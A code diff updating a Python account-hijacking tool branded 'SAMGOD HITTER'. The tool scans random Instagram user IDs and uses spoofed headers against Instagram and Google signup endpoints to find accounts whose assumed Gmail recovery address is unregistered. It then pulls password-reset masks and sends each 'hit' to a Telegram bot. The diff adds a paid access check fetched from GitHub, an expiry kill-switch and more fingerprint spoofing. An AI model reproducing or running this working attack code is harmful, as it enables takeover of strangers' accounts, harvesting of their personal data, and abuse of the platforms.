@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import sys
 import os
 import time
@@ -10,44 +13,47 @@ import uuid
 import secrets
 import base64
 import httpx
+import urllib.parse
 from datetime import datetime, timedelta, timezone
 from concurrent.futures import ThreadPoolExecutor
-
-try:
-    from user_agent import generate_user_agent
-except ImportError:
-    def generate_user_agent():
-        uas = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-        ]
-        return random.choice(uas)
-
-try:
-    from cfonts import render as cfonts_render
-except ImportError:
-    def cfonts_render(text, **kwargs):
-        return f"\n  === {text} ===\n"
+from user_agent import generate_user_agent
 
 MIN_FOLLOWERS = 0
-THREADS = 80
 
+# 🔐 GitHub Access List
 ACCESS_LIST_URL = "https://raw.githubusercontent.com/samkushwah61-create/sam-acces/main/expiry.txt"
-
 IST_OFFSET = timedelta(hours=5, minutes=30)
 
+expiry_date = datetime(2026, 10, 20, 23, 23, 23)
+current_date = datetime.now()
+
+if current_date > expiry_date:
+    print("\n❌ Your Time Has Expired!")
+    print("📞 FILE EXPIRED HO GYA HAI LADLE ")
+    sys.exit()
+
+THREADS = 80
+
 GOLD = '\x1b[38;5;220m'
-CYAN = '\x1b[38;5;51m'
-PINK = '\x1b[38;5;213m'
+ORANGE = '\x1b[38;5;208m'
+WHITE = '\x1b[38;5;255m'
+DIM = '\x1b[38;5;240m'
 GREEN = '\x1b[38;5;120m'
 RED = '\x1b[38;5;196m'
-YELLOW = '\x1b[38;5;226m'
-WHITE = '\x1b[1;37m'
-DIM = '\x1b[2;37m'
-RESET = '\033[0m'
-BOLD = '\x1b[1m'
-UNDERLINE = '\x1b[4m'
+CYAN = '\x1b[38;5;51m'
+RESET = '\x1b[0m'
+
+def print_banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print("\n")
+    print(f"{GOLD}           ✦           .            ★            .           ✦{RESET}")
+    print(f"{WHITE}                                   .            ✧{RESET}")
+    print(f"{GOLD}                               S A M G O D  {RESET}")
+    print(f"{WHITE}                              ✦          .{RESET}")
+    print(f"{GOLD}           ✧           .            ★            .           ✧{RESET}")
+    print("\n")
+    print(f"{DIM}                        DEV /  @SAMFYCKS / ✧           .              {RESET}")
+    print("\n")
 
 def check_telegram_access(user_id):
     try:
@@ -56,8 +62,7 @@ def check_telegram_access(user_id):
             print(f"{RED}⚠️ Access list fetch fail (status {response.status_code}){RESET}")
             return False
 
-        lines = response.text.strip().splitlines()
-        for line in lines:
+        for line in response.text.strip().splitlines():
             line = line.strip()
             if not line or "," not in line or ":" not in line:
                 continue
@@ -83,7 +88,7 @@ def check_telegram_access(user_id):
                     hours, seconds = divmod(seconds, 3600)
                     minutes, _ = divmod(seconds, 60)
                     print(f"{GREEN}✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃{RESET}")
-                    print(f"{YELLOW}⏳ 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {days}d {hours}h {minutes}m{RESET}")
+                    print(f"{GOLD}⏳ 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {days}d {hours}h {minutes}m{RESET}")
                     return True
                 else:
                     print(f"{RED}⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: Premium expired.{RESET}")
@@ -96,49 +101,54 @@ def check_telegram_access(user_id):
         print(f"{RED}⚠️ Access check error: {e}{RESET}")
         return False
 
-logo = cfonts_render('SAM', font='block', colors=['white', 'red', 'yellow'], align='center', space=True)
-print('\x1b[1;39m' + '═' * 60)
-print(logo)
-print('\x1b[1;39m' + '═' * 60)
-print(f'{GOLD}🔥 PROFESSIONAL HITTER — MONETIZATION READY 🔥{RESET}')
-print('')
+print_banner()
 
-chat_id = input(f'{CYAN}𝐈𝐃 𝐃𝐀𝐋  {RESET}').strip()
-print('')
+chat_id = input(f"{WHITE}Enter Telegram Chat ID: {RESET}").strip()
+print("")
 
+# 🔐 GitHub Access verification
 if not check_telegram_access(chat_id):
     print(f"{RED}❌ Access Denied. Exiting...{RESET}")
     sys.exit()
 
-print('')
-bot_token = input(f'{CYAN}𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 𝐃𝐀𝐋   {RESET}').strip()
-print('')
+bot_token = input(f"{WHITE}Enter Telegram Bot Token: {RESET}").strip()
+print("")
 os.system('cls' if os.name == 'nt' else 'clear')
 
-print('\x1b[1;39m' + '═' * 60)
-print(cfonts_render('SAM', font='block', colors=['white', 'red', 'yellow'], align='center', space=True))
-print('\x1b[1;39m' + '═' * 60)
-print(f'{GOLD}𝐒𝐀𝐌𝐆𝐎𝐃 🔱 𝐓𝐎𝐎𝐋𝐒 𝐀𝐂𝐓𝐈𝐕𝐄.....{RESET}')
+print_banner()
+print(f"{DIM}                          SAMGOD TOOLS ACTIVE{RESET}")
+print(f"{DIM}                 Auto Stop: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}{RESET}\n")
 
-print(f"\n{YELLOW}🔹 Minimum followers: {MIN_FOLLOWERS}{RESET}")
-print(f"{YELLOW}🔹 Threads: {THREADS}{RESET}\n")
+start_time = time.time()
+time_until_expiry = (expiry_date - current_date).total_seconds()
+if time_until_expiry <= 0:
+    print("\n❌ Expiry date has already passed.")
+    sys.exit()
+expire_time = start_time + time_until_expiry
 
 hits = 0
 good = 0
 bad = 0
+_display_lock = threading.Lock()
 
 def display():
     global hits, good, bad
-    stats = (f'\r{WHITE}┌────────────────────────────────────────────────┐{RESET}\n'
-             f'{WHITE}│{RESET}  {GREEN}🔰 𝐆𝐎𝐎𝐃 : {good}{RESET} │ {YELLOW}𝐇𝐈𝐓𝐒 : {hits}{RESET} │ {RED}𝐁𝐀𝐃 : {bad}{RESET}  {WHITE}│{RESET}\n'
-             f'{WHITE}└─────────────────────────────────────────────────┘{RESET}\n')
-    sys.stdout.write(stats)
-    sys.stdout.flush()
+    with _display_lock:
+        uptime = int(time.time() - start_time)
+        h, m, s = uptime // 3600, (uptime % 3600) // 60, uptime % 60
+        stats = (f"\r{GOLD}GOOD: {GREEN}{good}{RESET} {DIM}|{RESET} {GOLD}HITS: {hits}{RESET} "
+                 f"{DIM}|{RESET} {GOLD}BAD: {RED}{bad}{RESET} {DIM}|{RESET} "
+                 f"{DIM}TIME: {h:02d}:{m:02d}:{s:02d}{RESET}     ")
+        sys.stdout.write(stats)
+        sys.stdout.flush()
 
 class GoogleChecker:
     def __init__(self):
         self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
         threading.Thread(target=self._refresh_token, daemon=True).start()
+
+    def _generate_ua(self):
+        return generate_user_agent()
 
     def _refresh_token(self):
         while True:
@@ -146,12 +156,15 @@ class GoogleChecker:
                 n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                 n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                 host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))
-
                 headers = {
                     "accept": "*/*",
+                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                     "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                     "google-accounts-xsrf": "1",
-                    "user-agent": generate_user_agent(),
+                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "user-agent": self._generate_ua(),
                 }
                 res1 = requests.get(
                     'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
@@ -166,10 +179,13 @@ class GoogleChecker:
                     cookies = {'__Host-GAPS': host}
                     headers2 = {
                         'authority': 'accounts.google.com',
+                        'accept': '*/*',
+                        'accept-language': 'en-US,en;q=0.9',
                         'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                         'google-accounts-xsrf': '1',
                         'origin': 'https://accounts.google.com',
-                        'user-agent': generate_user_agent(),
+                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+                        'user-agent': self._generate_ua(),
                     }
                     data = {
                         'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
@@ -191,11 +207,17 @@ class GoogleChecker:
 
             try:
                 headers = {
+                    'accept': '*/*',
+                    'accept-language': 'en',
                     'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                     'origin': 'https://accounts.google.com',
-                    'user-agent': generate_user_agent(),
+                    'referer': 'https://accounts.google.com/',
+                    'user-agent': self._generate_ua(),
                     'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                     'x-same-domain': '1',
+                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
                 }
                 params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
                 fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
@@ -214,18 +236,16 @@ class GoogleChecker:
                     continue
             except Exception:
                 pass
-
             time.sleep(random.uniform(5, 15))
 
     def check_availability(self, email):
         if '@' in email:
             email = email.split('@')[0]
-
         try:
             with open('tl.txt', 'r') as f:
                 line = f.read().strip()
                 if not line:
-                    raise Exception("empty")
+                    raise Exception("Empty tl")
                 tl, host = line.split('//')
         except Exception:
             time.sleep(3)
@@ -239,19 +259,19 @@ class GoogleChecker:
         cookies = {'__Host-GAPS': host}
         headers = {
             'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
             'google-accounts-xsrf': '1',
             'origin': 'https://accounts.google.com',
-            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&TL={tl}',
+            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
             'user-agent': generate_user_agent(),
         }
         params = {'TL': tl}
         data = (
-            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
-            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
+            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
             f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
-            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
-            f'&cookiesDisabled=false'
+            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false'
             f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
             f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
         )
@@ -310,7 +330,6 @@ class InstagramChecker:
         family = str(uuid.uuid4())
         android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
         waterfall = str(uuid.uuid4())
-
         payload = {
             'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":" + str(int(time.time())) + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4()) + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32) + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"" + device + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\"" + waterfall + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"" + device + "\"}}",
             'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
@@ -318,11 +337,25 @@ class InstagramChecker:
         }
         headers = {
             'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
+            'accept-language': "en-IN, en-US",
             'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
-            'x-ig-app-id': "567067343352427",
+            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
             'x-ig-android-id': android,
+            'x-ig-app-id': "567067343352427",
+            'x-ig-app-locale': "en_IN",
+            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
             'x-ig-device-id': device,
             'x-ig-family-device-id': family,
+            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
+            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
+            'x-pigeon-rawclienttime': str(time.time()),
+            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
+            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
         }
         try:
             resp = requests.post(url, data=payload, headers=headers, timeout=20)
@@ -354,7 +387,11 @@ class InstagramChecker:
             return False
 
     def check_email(self, email):
-        return self._check_bloks(email) or self._check_web_create(email)
+        if self._check_bloks(email):
+            return True
+        if self._check_web_create(email):
+            return True
+        return False
 
     def get_user_data(self, user_id):
         if not self._ensure_tokens():
@@ -363,12 +400,16 @@ class InstagramChecker:
         headers = {
             'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
             'Content-Type': 'application/x-www-form-urlencoded',
+            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
             'x-ig-app-id': '936619743392459',
             'x-fb-lsd': self.lsd,
             'x-csrftoken': self.csrf,
             'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
+            'sec-ch-ua-platform': '"Android"',
             'origin': 'https://www.instagram.com',
+            'sec-fetch-site': 'same-origin'
         }
+        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
         variables = {
             "enable_integrity_filters": True,
             "id": str(user_id),
@@ -382,12 +423,14 @@ class InstagramChecker:
             'fb_api_caller_class': 'RelayModern',
             'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
             'variables': json.dumps(variables),
+            'server_timestamps': 'true',
             'doc_id': self.doc_id,
         }
         try:
-            response = self.session.post(url, headers=headers, data=payload, timeout=20)
+            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
             if response.status_code == 200:
-                user = response.json().get('data', {}).get('user')
+                data = response.json()
+                user = data.get('data', {}).get('user')
                 if user and user.get('username'):
                     return user
         except Exception:
@@ -395,47 +438,77 @@ class InstagramChecker:
         return None
 
 class ReportManager:
-    def __init__(self, token, chat_id):
+    def __init__(self, token, chat_id, proxy=None):
         self.token = token
         self.chat_id = chat_id
-        self._working = True
+        self.proxy = proxy
+        self.log_file = "telegram_errors.log"
+        self._telegram_working = True
+        self._error_logged = False
+
+    def _send_telegram_with_retry(self, msg, retries=3, delay=2):
+        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
+        payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
+        session = requests.Session()
+        if self.proxy:
+            session.proxies.update(self.proxy)
+        for attempt in range(retries):
+            try:
+                r = session.post(url, json=payload, timeout=15)
+                if r.status_code == 200:
+                    return True
+                else:
+                    if not self._error_logged:
+                        with open(self.log_file, 'a') as f:
+                            f.write(f"Telegram returned {r.status_code}: {r.text}\n")
+                        self._error_logged = True
+                    time.sleep(delay * (attempt + 1))
+            except Exception as e:
+                if not self._error_logged:
+                    with open(self.log_file, 'a') as f:
+                        f.write(f"Telegram send error: {e}\n")
+                    self._error_logged = True
+                time.sleep(delay * (attempt + 1))
+        return False
 
     def send_telegram(self, msg):
-        if not self._working:
-            return
-        try:
-            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
-            r = requests.post(url, json={"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}, timeout=15)
-            if r.status_code != 200:
-                self._working = False
-        except Exception:
-            self._working = False
+        if not self._telegram_working:
+            return False
+        success = self._send_telegram_with_retry(msg)
+        if not success:
+            self._telegram_working = False
+        return success
 
     def save_to_file(self, msg, filename='hits.txt'):
-        try:
-            with open(filename, 'a', encoding='utf-8') as f:
-                f.write(f'{msg}\n')
-        except Exception:
-            pass
+        with open(filename, 'a', encoding='utf-8') as f:
+            f.write(f'{msg}\n')
 
     def _get_monetization_status(self, data):
         followers = data.get('follower_count', 0)
+        posts = data.get('media_count', 0)
         is_private = data.get('is_private', True)
-        return "✅ Eligible" if followers >= 50 and not is_private else "❌ Not Eligible"
+        if followers >= 50 and posts >= 0 and not is_private:
+            return "✅ Eligible"
+        else:
+            return "❌ Not Eligible"
+
+    @staticmethod
+    def _esc(s):
+        return str(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
 
     def format_result(self, data):
         username = data.get('username', '')
-        full_name = data.get('full_name', '')
+        full_name = data.get('full_name', '') or '-'
         followers = data.get('follower_count') or 0
         following = data.get('following_count') or 0
         posts = data.get('media_count') or 0
         email = data.get('email', f"{username}@gmail.com")
         domain = email.split('@')[1] if '@' in email else 'gmail.com'
-        bio = data.get('biography', '')[:50]
+        bio = (data.get('biography', '') or '-')[:50]
         pk = data.get('pk', 0)
         try:
             pk = int(pk)
-            ranges = [
+            year_ranges = [
                 (1, 5000000, 2010), (5000001, 17750000, 2011), (17750001, 279760000, 2012),
                 (279760001, 900990000, 2013), (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                 (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017), (6345108210, 10016232395, 2018),
@@ -444,7 +517,7 @@ class ReportManager:
                 (70313426938, 78313496938, 2025)
             ]
             year = "2023+"
-            for low, high, y in ranges:
+            for low, high, y in year_ranges:
                 if low <= pk <= high:
                     year = str(y)
                     break
@@ -454,65 +527,53 @@ class ReportManager:
         reset_mask = self._fetch_reset_email(username)
         monetization = self._get_monetization_status(data)
 
-        lines = [
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-            "  ✦ SAMGOD 🔱 HIT FOUND ✦",
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-            f"  👤 Name       : {full_name}",
-            f"  🏷️ Username   : @{username}",
-            f"  📧 Email      : {email}",
-            f"  🌐 Domain     : {domain}",
-            f"  👥 Followers  : {followers:,}",
-            f"  🔄 Following  : {following:,}",
-            f"  📸 Posts      : {posts}",
-            f"  📅 Age        : {year}",
-            f"  💬 Bio        : {bio if bio else '-'}",
-            f"  🔒 Reset Mask : {reset_mask}",
-            f"  💰 Monetization: {monetization}",
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-            f"  🔗 Profile    : https://instagram.com/{username}",
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-            "     🚀 Powered by SAMGOD 🔱",
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        console_lines = [
+            f"\n{GOLD}✦ ─────────────────────────────────────── ✦{RESET}",
+            f"{GOLD}             SAMGOD HIT CAPTURED{RESET}",
+            f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}",
+            f"{WHITE}  Name      :{RESET} {DIM}{full_name}{RESET}",
+            f"{WHITE}  Username  :{RESET} @{username}",
+            f"{WHITE}  Email     :{RESET} {GREEN}{email}{RESET}",
+            f"{WHITE}  Domain    :{RESET} {domain}",
+            f"{WHITE}  Followers :{RESET} {followers:,}",
+            f"{WHITE}  Following :{RESET} {following:,}",
+            f"{WHITE}  Posts     :{RESET} {posts}",
+            f"{WHITE}  Age       :{RESET} {year}",
+            f"{WHITE}  Bio       :{RESET} {DIM}{bio}{RESET}",
+            f"{WHITE}  Reset     :{RESET} {reset_mask}",
+            f"{WHITE}  Monetize  :{RESET} {monetization}",
+            f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}",
+            f"{WHITE}  Profile   :{RESET} {CYAN}https://instagram.com/{username}{RESET}",
+            f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}\n",
         ]
+        console_msg = '\n'.join(console_lines)
 
-        colored = []
-        for line in lines:
-            if ':' in line and not line.startswith('━') and not line.startswith('  ✦') and not line.startswith('  🔗') and not line.startswith('     🚀'):
-                label, value = line.split(':', 1)
-                colored.append(f"{BOLD}{CYAN}{label.strip()}{RESET}: {WHITE}{value.strip()}{RESET}")
-            elif line.startswith('  ✦'):
-                colored.append(f"{GOLD}{line}{RESET}")
-            elif line.startswith('  🔗'):
-                colored.append(f"{CYAN}{line}{RESET}")
-            elif line.startswith('     🚀'):
-                colored.append(f"{YELLOW}{line}{RESET}")
-            elif line.startswith('━'):
-                colored.append(f"{DIM}{line}{RESET}")
-            else:
-                colored.append(f"{WHITE}{line}{RESET}")
-
-        console_msg = '\n'.join(colored)
-
-        html = []
-        for line in lines:
-            if ':' in line and not line.startswith('━') and not line.startswith('  ✦') and not line.startswith('  🔗') and not line.startswith('     🚀'):
-                label, value = line.split(':', 1)
-                html.append(f"<b>{label.strip()}</b>: {value.strip()}")
-            elif line.startswith('  ✦'):
-                html.append(f"<b>{line}</b>")
-            elif line.startswith('     🚀'):
-                html.append(f"<i>{line}</i>")
-            else:
-                html.append(line)
-        telegram_msg = '\n'.join(html)
-
-        return console_msg, telegram_msg
+        e = self._esc
+        tg_lines = [
+            "✦ ─────────────────────────────────────── ✦",
+            "             <b>SAMGOD HIT CAPTURED</b>",
+            "✦ ─────────────────────────────────────── ✦",
+            f"  <b>Name</b>      : {e(full_name)}",
+            f"  <b>Username</b>  : @{e(username)}",
+            f"  <b>Email</b>     : {e(email)}",
+            f"  <b>Domain</b>    : {e(domain)}",
+            f"  <b>Followers</b> : {followers:,}",
+            f"  <b>Following</b> : {following:,}",
+            f"  <b>Posts</b>     : {posts}",
+            f"  <b>Age</b>       : {year}",
+            f"  <b>Bio</b>       : {e(bio)}",
+            f"  <b>Reset</b>     : {e(reset_mask)}",
+            f"  <b>Monetize</b>  : {monetization}",
+            "✦ ─────────────────────────────────────── ✦",
+            f"  <b>Profile</b>   : <a href='https://instagram.com/{e(username)}'>@{e(username)}</a>",
+            "✦ ─────────────────────────────────────── ✦",
+        ]
+        return console_msg, '\n'.join(tg_lines)
 
     def _fetch_reset_email(self, username):
         try:
             headers = {
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
+                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                 "x-ig-app-id": "936619743392459",
                 "x-requested-with": "XMLHttpRequest",
                 "origin": "https://www.instagram.com",
@@ -538,6 +599,9 @@ insta = InstagramChecker()
 def process_user():
     global hits, good, bad
     while True:
+        if time.time() > expire_time:
+            print(f"\n{WHITE}Time expired. Stopping workers.{RESET}")
+            sys.exit(0)
         try:
             user_id = random.randint(2500000000, 21254029834)
             user_data = insta.get_user_data(user_id)
@@ -555,15 +619,12 @@ def process_user():
                 continue
 
             email = f"{username}@gmail.com"
-
             if insta.check_email(email):
                 good += 1
                 display()
-
                 if google.check_availability(email) == 'good':
                     hits += 1
                     display()
-
                     profile = {
                         'username': username,
                         'email': email,
@@ -576,17 +637,14 @@ def process_user():
                         'pk': user_data.get('pk', ''),
                     }
                     console_msg, telegram_msg = reporter.format_result(profile)
-                    print('\n' + GOLD + '═' * 60 + RESET)
+                    sys.stdout.write('\r' + ' ' * 80 + '\r')
                     print(console_msg)
-                    print(GOLD + '═' * 60 + RESET)
-
                     plain_msg = re.sub(r'<[^>]+>', '', telegram_msg)
                     reporter.save_to_file(plain_msg)
                     reporter.send_telegram(telegram_msg)
             else:
                 bad += 1
                 display()
-
             time.sleep(random.uniform(0.05, 0.15))
         except Exception:
             time.sleep(random.uniform(0.1, 0.2))
@@ -596,9 +654,8 @@ if __name__ == "__main__":
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
         for _ in range(THREADS):
             executor.submit(process_user)
-
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print('\n' + YELLOW + '◄  SAMGOD 🔱 HITTER  —  SESSION ENDED  ►' + RESET)
+        print('\n' + GOLD + '◄  SAMGOD HITTER  —  SESSION ENDED  ►' + RESET)
